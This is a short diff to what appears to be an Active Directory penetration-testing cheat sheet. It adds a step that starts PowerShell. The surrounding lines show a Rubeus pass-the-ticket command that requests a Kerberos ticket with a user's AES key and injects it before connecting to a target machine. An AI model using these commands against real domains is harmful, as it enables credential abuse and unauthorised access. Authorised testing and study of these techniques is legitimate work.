@@ -4717,6 +4717,12 @@ Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES_KEY> /ptt
   ASREP (key)              :  <AES_KEY>
 ```
 
+**Start PowerShell**
+
+```cmd
+powershell
+```
+
 **Connect to the target machine**
 
 ```powershell
